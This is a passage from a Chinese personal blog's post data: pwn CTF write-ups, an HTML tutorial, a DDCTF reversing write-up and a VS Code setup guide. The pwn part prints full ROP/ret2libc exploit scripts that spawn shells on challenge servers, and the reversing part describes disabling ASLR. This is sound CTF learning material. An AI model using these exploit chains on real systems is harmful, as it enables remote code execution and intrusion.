''.join(map(p64,rop1)) io.sendline(p) io.recvline_contains('again') s = io.recvline_contains('again') libc_base = int(u64(s[32:38].ljust(8,'\\x00'))) - libc_start_sys RCE = libc_base + 0x4526a print('libc_base:'+hex(libc_base)) io.recvuntil('name? ') # io.recvuntil('name? ') p = '\\x00' * offset + p64(RCE) + '\\x00' * 70 sleep(1) raw_input('-&gt;') io.sendline(p) io.interactive() 无libc这一部分目前主要是利用LibcSearcher来做的，有时候题目不给libc，用这个也可以解决部分题目。~~用这个以后就不能很方便的用onegadget去一键拿shell了，感觉还是有办法的，想办法拿到LibcSearcher获取到的libc版本就好了，找个时间去实践一下，先慢慢构建rop链就好，正好练习一下这种方法拿shell。~~已经测试出办法咯。https://github.com/lieanu/LibcSearcher bjdctf_2020_babyrop查保护和arch ida分析函数十分简单，明显栈溢出，思路就是先栈溢出构造rop链，让puts函数打印出__libc_start_main函数的地址，然后再用libcsearcher来获取一下它的libc版本，然后再计算出它的基址，再让函数返回到最初清理一下栈，然后再次进行溢出构造关于system(&#39;/bin/sh&#39;)的rop链即可。 expfrom pwn import * from LibcSearcher import * import time # context.log_level = 'debug' io = remote('node3.buuoj.cn',28661) # io = process('./bjdctf_2020_babyrop') elf = ELF('./bjdctf_2020_babyrop') # blibc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so') io.recvuntil('story!\\n') padding = 40 libc_main_add = elf.got['__libc_start_main'] puts_add = elf.symbols['puts'] pop_rdi_ret = 0x0400733 p = 'a'*padding + p64(pop_rdi_ret) + p64(libc_main_add) + p64(puts_add) + p64(0x400530) io.sendline(p) s = u64(io.recv(6).ljust(8,'\\x00')) print(hex(s)) obj = LibcSearcher(\"__libc_start_main\",s) libc_base = s - obj.dump(\"__libc_start_main\") system_add = libc_base + obj.dump(\"system\") binsh_add = libc_base + obj.dump(\"str_bin_sh\") sleep(1) io.recvuntil('story!\\n') p = 'a'*padding + p64(pop_rdi_ret) + p64(binsh_add) + p64(system_add) io.sendline(p) io.interactive() unctf_easyrop查保护和arch ida分析主程序主要就是限制了v2需要等于ffff才能进入带有溢出的函数，v2的值是这个在read的时候把控好，让ffff填入这个位置即可。然后进入这个带有溢出漏洞的函数，可以看到buf的首地址是ebp-0x10，然后分析下这里的汇编，它把read函数的溢出位置返回值ebp-0x14取出来，与0x8050000进行比较。也可以看出，这里是防止我们进行ret2libc的。那我们构造这里可以用一个ret来进行绕过。 思路总结先控制好v2让其等于ffff，然后进入带有溢出的函数，然后构造rop链，先把__libc_start_main的内存地址泄露出来，然后用libcseacher来确定libc版本，然后dump出__libc_start_main的sympols,算出基址后，接着返回到开始处清理一下栈，再次溢出跟原来一样。然后再次构造rop链的时候，注意ret绕过对咱们溢出地址的检测，在调用system(‘/bin/sh’)即可。 expfrom pwn import * from LibcSearcher import * import time # context.log_level = 'debug' io = process('./easyrop') # io = remote('183.129.189.60',10011) io.recvuntil('TFer!\\n') e =ELF('./easyrop') raw_input('-&gt;') padding = 36 start_add = 0x08048400 libc_start_main = e.got['__libc_start_main'] puts_add = e.symbols['puts'] ret = 0x0804839e p = 'f' * padding rop1 = [ puts_add, start_add, libc_start_main ] io.sendline(p) io.recvuntil('name?\\n') p = '\\x00' * 0x18 + ''.join(map(p32,rop1)) raw_input('&gt;') io.sendline(p) libc_start_add = u32(io.recv(4)) obj = LibcSearcher(\"__libc_start_main\",libc_start_add) libc_base = libc_start_add - obj.dump(\"__libc_start_main\") print(libc_base) system_add = obj.dump('system') + libc_base binsh_add = obj.dump('str_bin_sh') + libc_base io.recvuntil('TFer!\\n') p = 'f' * padding io.sendline(p) io.recvuntil('name?\\n') rop2 = [ ret, system_add, start_add, binsh_add ] p = '\\x00' * 0x14 + ''.join(map(p32,rop2)) sleep(1) io.sendline(p) io.interactive() 铁人三项(第五赛区)_2018_rop查保护和arch32位 ida分析int __cdecl main(int argc, const char **argv, const char **envp) &#123; be_nice_to_people(); vulnerable_function(); return write(1, \"Hello, World\\n\", 0xDu); &#125; 主函数很简单，漏洞函数是在第二个函数。栈溢出，然后直接构造rop链即可。利用思路：用wirte函数泄露出__libc_start_main在内存地址，然后返回start清理一下栈，用libcseacher确定下libc版本，然后进行构造system(‘/bin/sh’)的rop链即可。 这个我是发现可以用libcseacher确定libc版本后，用one_gadget工具计算RCE位置，然后实现ret to RCE。libcseacher获取到leak地址后，在执行dump libc前的时候，会告诉你，它确定的libc版本号是多少。这个是让你选择的。 在下载的libcseacher时候，其实它是有个数据库的，这里面存着各种libc版本，方便咱们使用。那这个时候，直接用one_gadget 计算下RCE偏移即可。 expfrom pwn import * from LibcSearcher import * context.log_level = 'debug' context.arch = 'i386' elf = ELF('./2018_rop') # io = process('./2018_rop') io = remote('node3.buuoj.cn',29692) padding = 140 write_plt = elf.symbols['write'] libc_start_main_got = elf.got['__libc_start_main'] start = 0x080483C0 p = padding * '\\x00' + flat([write_plt,start,1,libc_start_main_got,0x10]) # raw_input('-&gt;') io.sendline(p) libc_start_main_add = u32(io.recv(4)) obj = LibcSearcher('__libc_start_main',libc_start_main_add) libc_base = libc_start_main_add - obj.dump('__libc_start_main') system_add = libc_base + obj.dump('system') binsh_add = libc_base + obj.dump('str_bin_sh') # print(libc.symbols['__libc_start_main']) print(hex(libc_base)) # io.recvline() RCE = libc_base + 0x3cbec p = padding * '\\x00' + p32(RCE) + padding * '\\x00' # p = padding * '\\x00' + p32(system_add) + p32(start) + p32(binsh_add) io.sendline(p) io.interactive() 这里面两种办法都行。 xdctf2015_pwn200查保护和archArch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) ida分析主函数十分简单，漏洞在vuln函数：padding为 6c+4 个字节。跟上题很像的攻击思路，直接给exp了。 expfrom pwn import * from LibcSearcher import * # io = process('./bof') io = remote('node3.buuoj.cn',27178) elf = ELF('./bof') libc = elf.libc context.arch = 'i386' context.log_level = 'debug' padding = 112 start_add = 0x080483E0 libc_start_main_got = elf.got['__libc_start_main'] write_plt = elf.symbols['write'] io.recvuntil('2015~!\\n') p = padding * '\\x00' + flat([write_plt,start_add,1,libc_start_main_got,0x10]) io.sendline(p) libc_start_main_add = u32(io.recv(4)) obj = LibcSearcher('__libc_start_main',libc_start_main_add) libc_base = libc_start_main_add - obj.dump('__libc_start_main') print(hex(libc_start_main_add)) print(hex(libc_base)) io.recvuntil('2015~!\\n') rce = libc_base + 0x3a80c p = padding * '\\x00' + p32(rce) + padding * '\\x00' io.sendline(p) io.interactive() 还是本地来base库查libc的one_gadget，然后ret to rce。","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"},{"name":"ROP","slug":"ROP","permalink":"http://chumen77.xyz/tags/ROP/"}]},{"title":"HTML 基础","slug":"HTML 基础","date":"2019-12-29T13:42:51.000Z","updated":"2020-02-28T07:52:37.000Z","comments":true,"path":"2019/12/29/HTML 基础/","link":"","permalink":"http://chumen77.xyz/2019/12/29/HTML 基础/","excerpt":"","text":"HTML 基础 HTML标题：是通过 &lt;h1&gt; - &lt;h6&gt; 标签来定义的.；其会因为数字变化而显示的字体大小变化； HTML段落：通过标签&lt;p&gt; 来定义的. HTML链接：通过标签&lt;a&gt;来定义的。 HTML图像：通过标签 &lt;img&gt; 来定义的。 HTML 文本HTML 标题标题（Heading）是通过&lt;h1&gt; - &lt;h6&gt; 标签进行定义的.&lt;h1&gt; 定义最大的标题。 &lt;h6&gt;定义最小的标题。浏览器会自动地在标题的前后添加空行。 标题很重要： 不要仅仅是为了生成粗体或大号的文本而使用标题，而是==为了用户可以通过标题来快速浏览您的网页应该将 h1 用作主标题==（最重要的），其后是 h2（次重要的），再其次是 h3，以此类推。 HTML 注释注释： 开始括号之后（左边的括号）需要紧跟一个叹号，结束括号之前（右边的括号）不需要，合理地使用注释可以对未来的代码编辑工作产生帮助。。 &lt;!-- 这是一个注释 --&gt; HTML 段落浏览器会自动地在段落的前后添加空行。（&lt;/p&gt;是块级元素） HTML 水平线1：&lt;hr&gt;标签在 HTML 页面中创建水平线。 HTML 文本格式化通常用到&lt;strong&gt;&lt;em&gt;&lt;del&gt;这几个标签。 练习：&lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;文本&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;!-- &lt;h1&gt;标题1&lt;/h1&gt; &lt;h2&gt;标题2&lt;/h2&gt; &lt;h3&gt;标题3&lt;/h3&gt; &lt;h4&gt;标题4&lt;/h4&gt; &lt;h5&gt;标题5&lt;/h5&gt; &lt;h6&gt;标题6&lt;/h6&gt; --&gt; &lt;!-- &lt;h&gt;标签有大小之分 --&gt; &lt;h2&gt;五花山&lt;/h2&gt; &lt;p&gt;我家住在大山里。你知道这里的山是什么颜色的吗？&lt;/p&gt; &lt;p&gt;春天的山是绿色的，那绿色淡淡的，许多树叶刚冒出芽来，还带着嫩嫩的黄色呢。&lt;/p&gt; &lt;p&gt;夏天的山也是绿色的，那绿色浓浓的，一片片树叶，不管是大的还是小的，都像被绿油彩涂过，连雨点落上去，都给染绿了。&lt;/p&gt; &lt;p&gt;秋天的山不再是一种颜色了。下过一场秋霜有的树林变成了金黄色□好像所有的阳光都集中到那儿去了有的树林变成了杏黄色远远望去，就像枝头挂满了熟透的杏和梨；有的树林变成了火红色，风一吹，树林跳起舞来，就像一簇簇火苗在跳跃；还有的树林变得紫红紫红，跟剧场里的紫绒幕布的颜色一样。只有松柏不怕秋霜，针一样的叶子还是那么翠绿。&lt;/p&gt; &lt;p&gt;秋天的山一片金黄，一片火红，一片翠绿……人们给这五颜六色的山起了个好听的名字，叫“&lt;strong&gt;&lt;em&gt; &lt;del&gt;五花山&lt;/del&gt;&lt;/em&gt;&lt;/strong&gt;”。&lt;/p&gt; &lt;!-- 几个标签的嵌套 --&gt; &lt;strong&gt;加粗&lt;/strong&gt; &lt;em&gt;斜体&lt;/em&gt; &lt;del&gt;删除文字&lt;/del&gt;&lt;!-- &lt;span&gt;配合css&lt;/span&gt; --&gt; &lt;/body&gt; &lt;/html&gt; 效果： HTML 图像 ==HTML 图像-== ： 标签（ &lt;img&gt;）是空标签，意思是说，它只包含属性，并且没有闭合标签。 源属性（&lt;src&gt;）是图像的 URL 地址。分为本地和网上，本地图片写路径的时候注意绝对路径和相对路径（可以用../来返回 一级目录，返回几级目录就写几个它就行)。 Alt属性:alt 属性用来为图像定义一串预备的可替换的文本,在浏览器无法载入图像时,告用户图片的信息。==搜索引擎也是通过此描述来收集图片的==. 高度与宽度:height（高度） 与 width（宽度）属性用于设置图像的高度与宽度。属性值默认单位为像素px。 练习： &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;图片&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;img src=\"1.png\" alt=\"chumen的qq图像\" title=\"chumen的qq图像\"&gt; &lt;/body&gt; &lt;/html&gt; 图片的映射目标是为了在一张图片上的某个位置点击后才可以实现某个功能。 这需要用到usemap=&quot;#diyname&quot; 然后用&lt;map name=&quot;diyname&quot;&gt;&lt;/map&gt;标签来对应。 核心代码：` &lt;area shape=\"\" coords=\"\" href=\"\"&gt; \\\\` shape是选择的形状，coords是坐标，坐标确定推荐用qq的截图功能那里来确定，比如： 那这个彩色箭头指的位置就是在这个图像的（233,456）位置。 练习： &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;图片的映射&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;img src=\"1.png\" alt=\"\" usemap=\"#1map\"&gt; &lt;map name=\"1map\"&gt; &lt;area shape=\"circle\" coords=\"300,255,50\" target=\"_blank\" href=\"http://www.baidu.com\"&gt; &lt;/map&gt; &lt;/body&gt; &lt;/html&gt; 效果： HTML 超链接超链接可以是一个字，一个词，或者一组词，也可以是一幅图像，您可以点击这些内容来跳转到新的文档或者当前文档中的某个部分。使用标签 &lt;a&gt;来设置超文本链接。 HTML 链接语法:&lt;a href=&quot;url&quot;&gt;链接文本&lt;/a&gt; ,href 属性描述了链接的目标。 target 属性 :target=&quot;_blank&quot;效果就是在新窗口（空白界面）做出来 。 id 属性:id属性可用于创建在一个HTML文档书签标记,在HTML文档中插入ID: &lt;a id=&quot;tips&quot;&gt;有用的提示部分&lt;/a&gt; 在HTML文档中创建一个链接到”有用的提示部分(id=”tips”）”: &lt;a href=&quot;#tips&quot;&gt;访问有用的提示部分&lt;/a&gt; 解释加补充：ID 属性名字只能有一个不可重复，且必须以==字母==开头，可以在一个界面的任何位置的内容进行设置ID，在设置完后，（&lt;a href=&quot;# &quot;&gt;），在==“#”==后加入id的名称即可跳转到你设置ID的内容处。 &lt;a name=&quot;end&quot;&gt;&lt;/a&gt; &lt;a href=&quot;#end&quot;&gt;end&lt;/a&gt; 做锚点时，替换id的方法，作用可以实现一样！id不好用时用这个 练习：（为了方便阅读，省略了很多的&lt;br&gt;.） &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;超级链接&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;a href=\"http://www.mi.com\" target=\"_blank\"&gt;&lt;img src=\"1.png\"&gt;&lt;/a&gt; &lt;!-- /*书签标记：锚点*/ --&gt; &lt;a href=\"#end\"&gt;end&lt;/a&gt; &lt;br id=\"aa\"&gt; &lt;br&gt; &lt;br id=\"miao\"&gt; &lt;br&gt; &lt;br&gt; &lt;br&gt; &lt;a name=\"miao\"&gt;&lt;/a&gt; &lt;br&gt; &lt;br&gt; &lt;br&gt; &lt;br&gt; &lt;a name=\"end\"&gt;&lt;/a&gt; &lt;a href=\"#miao\"&gt;miao&lt;/a&gt; &lt;/body&gt; &lt;/html&gt; HTML 列表 HTML无序列表：&lt;ul&gt;与 &lt;li&gt;其点的样式(圆圈，圆心，正方形）用css来控制&lt;ul style=&quot;list-style-type:circle&quot;&gt; HTML 有序列表 &lt;ol&gt;与&lt;li&gt; 用法和无序相似，且有序与无序之间可以互相嵌套，嵌套过程中点的形状也会自动变化。 HTML 自定义列表：这个是比较常用的，自定义列表以&lt;dl&gt; 标签开始。每个自定义列表项以 &lt;dt&gt; 开始。每个自定义列表项的定义以 &lt;dd&gt;开始。其不仅仅是一列项目，而是项目及其注释的组合。 &lt;dl&gt; &lt;dt&gt;Coffee&lt;/dt&gt; &lt;!-- 列表标题 --&gt; &lt;dd&gt;- black hot drink&lt;/dd&gt; &lt;!-- 其内容 --&gt; &lt;dt&gt;Milk&lt;/dt&gt; &lt;dd&gt;- white cold drink&lt;/dd&gt; &lt;/dl&gt; 练习： &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;列表&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;ul style=\"list-style-type:circle\"&gt; &lt;li&gt;无序列表1&lt;/li&gt; &lt;li&gt;无序列表2&lt;/li&gt; &lt;li&gt;无序列表3&lt;/li&gt; &lt;li&gt;无序列表4&lt;/li&gt; &lt;/ul&gt; &lt;ol&gt; &lt;li&gt;有序列表1&lt;/li&gt; &lt;li&gt;有序列表2&lt;/li&gt; &lt;li&gt;有序列表3&lt;/li&gt; &lt;li&gt;有序列表4&lt;/li&gt; &lt;/ol&gt; &lt;dl&gt; &lt;dt&gt;标题1&lt;/dt&gt; &lt;dd&gt;自定义列表1&lt;/dd&gt; &lt;dd&gt;自定义列表2&lt;/dd&gt; &lt;dd&gt;自定义列表3&lt;/dd&gt; &lt;dd&gt;自定义列表4&lt;/dd&gt; &lt;dt&gt;标题2&lt;/dt&gt; &lt;dd&gt;自定义列表1&lt;/dd&gt; &lt;dd&gt;自定义列表2&lt;/dd&gt; &lt;dd&gt;自定义列表3&lt;/dd&gt; &lt;dd&gt;自定义列表4&lt;/dd&gt; &lt;/dl&gt; &lt;/body&gt; &lt;/html&gt; 效果： HTML表格 HTML 表格：表格由 &lt;table&gt;标签来定义。每个表格均有若干==行==（由 &lt;tr&gt; 标签定义），每行被分割为若干==单元格==（由 &lt;td&gt; 标签定义）。字母 td 指表格数据（table data），即数据单元格的内容。数据单元格可以包含文本、图片、列表、段落、表单、水平线、表格等等。这个有利于多样化，在分清栏目后在td里放内容就ok。 HTML 边框属性:&lt;table border=&quot;1&quot;&gt;会出现表框。 HTML 表格表头:表格的表头使用 &lt;th&gt; 标签进行定义。&lt;th&gt;标签与&lt;td&gt;标签用法相似只是显示的效果不同，会有粗体居中的效果； HTML表格合并：用 colspan： 横向行 rowspan ：竖纵行。 HTML表格单元格边距的设置：类似 设置边框 直接在table标签里放入cellpadding=“自定义的数字”，就设置好了。 练习： &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;表格&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;table border=\"1\"&gt; &lt;tr&gt; &lt;th&gt;部门&lt;/th&gt; &lt;th&gt;姓名&lt;/th&gt; &lt;th&gt;性别&lt;/th&gt; &lt;th&gt;工资&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td rowspan=\"3\"&gt;开发组&lt;/td&gt; &lt;td&gt;小明&lt;/td&gt; &lt;td&gt;男&lt;/td&gt; &lt;td&gt;1w&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;小白&lt;/td&gt; &lt;td&gt;女&lt;/td&gt; &lt;td&gt;1w&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td colspan=\"2\"&gt;工资合计&lt;/td&gt; &lt;td&gt;2w&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/body&gt; &lt;/html&gt; 效果： HTML 表单表单是一个包含表单元素的区域。表单元素是允许用户在表单中输入内容,比如：文本域(textarea)、下拉列表、单选框(radio-buttons)、复选框(checkboxes)等等。 `input元素 \\\\\\\\\\` HTML 表单 - 输入元素输入标签&lt;input&gt;。 文本域文本域通过&lt;input type=&quot;text&quot;&gt; 标签来设定，当用户要在表单中键入字母、数字等内容时，就会用到文本域。 `First name: Last name: \\\\\\\\\\` 在大多数浏览器中，文本域的缺省宽度是20个字符。 密码字段&lt;input type=&quot;password&quot;&gt; 来定义 &lt;form&gt; Password: &lt;input type=\"password\" name=\"pwd\"&gt; &lt;/form&gt; 单选按钮&lt;input type=&quot;radio&quot;&gt; 标签定义了表单单选框选项。 &lt;form&gt; &lt;input type=\"radio\" name=\"sex\" value=\"male\"&gt;Male&lt;br&gt; &lt;input type=\"radio\" name=\"sex\" value=\"female\"&gt;Female &lt;/form&gt; Name 是可以进行==分组==。想要有效果 value也少不了。 复选框&lt;input type=&quot;checkbox&quot;&gt;定义了复选框. 用户需要从若干给定的选择中选取一个或若干选项。 &lt;form&gt; &lt;input type=\"checkbox\" name=\"vehicle\" value=\"Bike\"&gt;I have a bike&lt;br&gt; &lt;input type=\"checkbox\" name=\"vehicle\" value=\"Car\"&gt;I have a car &lt;/form&gt; 类似单选三者缺一不可。 提交按钮&lt;input type=&quot;submit&quot;&gt;定义了提交按钮. &lt;form name=\"input\" action=\"\" method=\"\"&gt; Username: &lt;input type=\"text\" name=\"user\"&gt; &lt;input type=\"submit\" value=\"Submit\"&gt; &lt;/form&gt; ==value：提交数据到服务器的值（后台程序PHP使用）写按钮时一定要写上。 name：为控件命名，以备后台程序 ASP、PHP 使用== 练习：&lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;表单&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=\"\"&gt; &lt;!-- action 中值为提交的网页 --&gt;&lt;!-- 默认为get --&gt; admin&lt;input type=\"text\" name=\"user\"&gt; password&lt;input type=\"password\" name=\"password\"&gt; &lt;br&gt; &lt;input type=\"radio\" name=\"sex1\" value=\"male\"&gt;男 &lt;br&gt; &lt;input type=\"radio\" name=\"sex1\" value=\"female\"&gt;女 &lt;input type=\"radio\" name=\"sex\"&gt;中性&lt;!-- name中值一样那么其分组就一样 --&gt; &lt;!-- &lt;input type=\"radio\" name=\"sex\"&gt;男 &lt;input type=\"radio\" name=\"sex\"&gt;女 &lt;input type=\"radio\" name=\"sex\"&gt;中性 --&gt; &lt;br&gt; &lt;!-- 兴趣复选框 --&gt; &lt;input type=\"checkbox\" name=\"xq\" value=\"kanshu\"&gt; 看书 &lt;input type=\"checkbox\" name=\"xq\" value=\"xuexi\"&gt; 学习 &lt;input type=\"checkbox\" name=\"xq\" value=\"music\"&gt; 听歌 &lt;br&gt; 城市&lt;select name=\"city\"&gt; &lt;option value=\"shanghai\"&gt;上海&lt;/option&gt; &lt;option value=\"beijing\"&gt;北京&lt;/option&gt; &lt;/select&gt; &lt;input type=\"submit\" name=\"\"&gt;&lt;br&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; 效果： HTML布局HTML 布局 - 使用&lt;div&gt; 元素. 可以先分为头部div 底部div 和中间的div，然后逐步添加标签进行扩充，用css来设置样式。 这中间需要用到float：left等 来控制一个div中套用的div的位置。 HTML中&lt;div&gt;元素是块级元素，它可用于组合其他 HTML元素的容器。 &lt;div&gt; 元素的另一个常见的用途是文档布局。&lt;div&gt;元素经常与 CSS 一起使用，用来布局网页。 &lt;div&gt; 元素没有特定的含义。 练习： &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;布局&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;!-- &lt;div style=\"background: yellow; width: 50px;\"&gt; 这是个div这是个div这是个div这是个div &lt;/div&gt; --&gt; &lt;div style=\"background: yellow;height: 100px;\"&gt;导航&lt;/div&gt; &lt;div style=\"background: green;width: 20%; float: left; height: 300px;\"&gt;菜单&lt;/div&gt; &lt;di+v style=\"background: red;width: 80%; float: left;height: 300px;\"&gt;内容&lt;/div&gt; &lt;/body&gt; &lt;/html&gt; HTML嵌套规则元素分类： 文字类块元素：p h1~h6 容器类块元素：div table tr td th form ul li ol dl dt dd 行元素:不独立成行，不可以 内容决定a img input strong em del span 特殊字符:br 规则 块元素可以嵌套行元素 &lt;div&gt;这是div &lt;a href=&quot;&quot;&gt;这是a&lt;/a&gt; &lt;/div&gt; 行元素可以嵌套行元素 &lt;a href=&quot;&quot;&gt;这是个&lt;strong〉 a&lt;/strong&gt; 行元素不可以嵌套块元素 文字类抉元素不可以嵌套块元素 容器类抉元素可以嵌套块元素","categories":[],"tags":[{"name":"学习记录","slug":"学习记录","permalink":"http://chumen77.xyz/tags/学习记录/"}]},{"title":"DDCTF2019-RE-Windows Reverse","slug":"DDCTF2019-RE-Windows Reverse","date":"2019-11-17T09:38:51.000Z","updated":"2020-02-28T07:52:52.000Z","comments":true,"path":"2019/11/17/DDCTF2019-RE-Windows Reverse/","link":"","permalink":"http://chumen77.xyz/2019/11/17/DDCTF2019-RE-Windows Reverse/","excerpt":"","text":"DDCTF2019-RE-Windows Reverse前言在一个论坛里发现DDCTF这两道逆向题不是很难，就想着做一下练练手。因为最近做的都是比较老的题目，这个还算新一点的。题目下载：reverse1_final.zipreverse2_final.exe.zip reverse1_final.exe查壳可以看出是UPX壳。另外： /Volumes/data/ctf逆向题目/2019ddctf  file reverse1_final.exe reverse1_final.exe: PE32 executable (console) Intel 80386, for MS Windows, UPX compressed在mac终端也可以用file命令查出。 脱壳直接在终端UPX -d 脱了就可以了。 运行发现直接是运行不了的，想到是不是因为脱壳后这个需要资源修复，各种操作修复后发现还是不可以。最后查询他人wp发现这个程序开启了ASLR。需要pe工具去关闭这个程序的ASLR。然后我就去查了ASLR是怎么关闭的，且其是什么东西。 ASLRASLR通过随机放置进程关键数据区域的地址空间来防止攻击者能可靠地跳转到内存的特定位置来利用函数。现代操作系统一般都加设这一机制，以防范恶意程序对已知地址进行Return-to-libc攻击。 –百度百科随后又查询到win7以后的windows系统都是有这个机制的，但因为有它的存在每次od载入时，其映像基址都是会变化的，而你有时候需要计算一些地址，基址老是变。以前我是不知道这个的，知道以后感觉这个是更加利于对程序的分析，就想着直接关闭windows7的ASLR。 关闭ASLR有两种办法。 改注册表注册表添加了一个DWORD键值项，其值为0。注意其名称和路径。 软件关闭下载EMET：https://www.updatestar.com/directdownload/emet/2258274关闭后重启即可。 成功运行程序成功运行后发现：这个估计又是字符对比。用IDA打开分析其逻辑。 IDA静态分析主函数int __cdecl main(int argc, const char **argv, const char **envp) { char v4; // [esp+4h] [ebp-804h] char v5; // [esp+5h] [ebp-803h] char v6; // [esp+404h] [ebp-404h] char Dst; // [esp+405h] [ebp-403h] v6 = 0; memset(&amp;Dst, 0, 0x3FFu); v4 = 0; memset(&amp;v5, 0, 0x3FFu); printf(&quot;please input code:&quot;); scanf(&quot;%s&quot;, &amp;v6); sub_401000(&amp;v6); if ( !strcmp(&amp;v4, &quot;DDCTF{reverseME}&quot;) ) printf(&quot;You&apos;ve got it!!%s\\n&quot;, &amp;v4); else printf(&quot;Try again later.\\n&quot;); return 0; }代码很简单，可以看出来是在接受输入后，经过sub_401000函数分处理后与DDCTF{reverseME}对比，正确就输出You’ve got it!。 处理函数sub_401000unsigned int __cdecl sub_401000(const char *a1) { _BYTE *v1; // ecx unsigned int i; // edi unsigned int result; // eax const char *v4; // ebx i = 0; result = strlen(a1); if ( result ) { v4 = (a1 - v1); do { *v1 = byte_402FF8[v1[v4]]; ++i; ++v1; result = strlen(a1); } while ( i &lt; result ); } return result; }可以看出来输入的东西的确在这里进行了，一位位的处理。用这里的字符串进行了替换。但是跳转查看发现没什么东西，发现最下方一段不知道有什么用的字符串。静态分析至此，没什么思路了。用od来看看我们输入的字符串会变成什么样。 OD动态分析定位在这个字符串之前应该就可以看到我们输入后被处理后的字符串。在前面一个函数进行下断点，也可以清楚看到他就是我们刚刚说的加密函数这就是一个地址。然后我们输入123测试已经穿进eax。直接F8不进入函数内部，因为我们的目的就看怎么处理了我们输入的字符串。发现变成了mlk。查看下对应的ASCIL:可以明显发现处理前的字符与处理后的字符相加都等于158。 脚本解密#include &lt;iostream&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; int main() { char arr[]=&quot;DDCTF{reverseME}&quot;; for (int i = 0; i &lt; strlen(arr); i++) { arr[i]=158-arr[i]; } printf(&quot;%s&quot;,arr); }%是VC编译的字符串结束标志不用代入。 总结在某在题目中，静态分析加密函数有些困难的时候，往往没有动态分析来的快，感觉动静结合分析是很好的。","categories":[],"tags":[{"name":"Re","slug":"Re","permalink":"http://chumen77.xyz/tags/Re/"}]},{"title":"Vscode的简单调教","slug":"Vs code的简单调教","date":"2019-11-15T02:55:26.000Z","updated":"2020-02-28T07:53:02.000Z","comments":true,"path":"2019/11/15/Vs code的简单调教/","link":"","permalink":"http://chumen77.xyz/2019/11/15/Vs code的简单调教/","excerpt":"","text":"Vscode的简单调教前言VScode是比较适合自己使用的，因为非常的简洁且不臃肿，拓展性还好。并且自己常写代码是就是为了输入输出实现某些功能，基本用不到调试功能。但碍于难以配置各种环境，一直没有用上，失败了很多次。现在又学着整了一下，现在已经吃上了vscode的香。写个博客，记录一下，也可以分析下经验。 正常设置 在这里点击完设置以后，会出现：在这里可以设置vscode的各种地方，就如图中一样，需要自己探索一下，然后设置成自己想要的结果。 配置编译环境这里我只用到c/c++和Python就只记录这个了。输入C/C++在这里进行点个install。PYthon也是同样的操作。 让代码跑起来在应用商店里搜索Code Runner。这个是个神器，有了它就可以在vscode直接运行各种代码。安装好后把vscode关闭，然后重新打开。 新建个C/C++文件：然后右键是可以运行代码的。在右上角：这个小三角也可以运行代码。看下效果： 更改为终端输出我们改一下代码： #include int main() { int a; scanf(“%d”,&amp;a); printf(“hello world!”); } 在这样直接运行后发现：卡在运行过程且我们无法输入：这个解决办法就是更改为终端输出就可以了。点击配置扩展信息。下滑找到：然后打个勾就可以了。运行：发现成功了，然后看下其原理就是帮你对终端进行了cd &quot;/Volumes/data/c:c++/&quot; &amp;&amp; g++ test.cpp -o test &amp;&amp; &quot;/Volumes/data/c:c++/&quot;test这个命令的执行，发现其是用gcc进行了编译，mac是自带clang的，clang的优点挺多的，且支持语法错误的检测，然后就想着去改下让其用clang++来编译。 自定义运行逻辑还是进入这个配置里面：在settings.json中编辑: &quot;code-runner.executorMap&quot; : { &quot;java&quot;: &quot;cd $dir &amp;&amp; javac $fileName &amp;&amp; java $fileNameWithoutExt&quot;, &quot;c&quot;: &quot;cd $dir &amp;&amp; clang++ $fileName -o $fileNameWithoutExt &amp;&amp; $dir$fileNameWithoutExt&quot;, &quot;cpp&quot;: &quot;cd $dir &amp;&amp; clang++ $fileName -o $fileNameWithoutExt &amp;&amp; $dir$fileNameWithoutExt&quot;, &quot;objective-c&quot;: &quot;cd $dir &amp;&amp; clang++ -framework Cocoa $fileName -o $fileNameWithoutExt &amp;&amp; $dir$fileNameWithoutExt&quot;, &quot;php&quot;: &quot;php&quot;, &quot;python&quot;: &quot;python -u&quot;, &quot;ruby&quot;: &quot;ruby&quot;, }成品：直接粘贴这段代码放入这里面保存就可以了。 效果：实现我们的目的了。 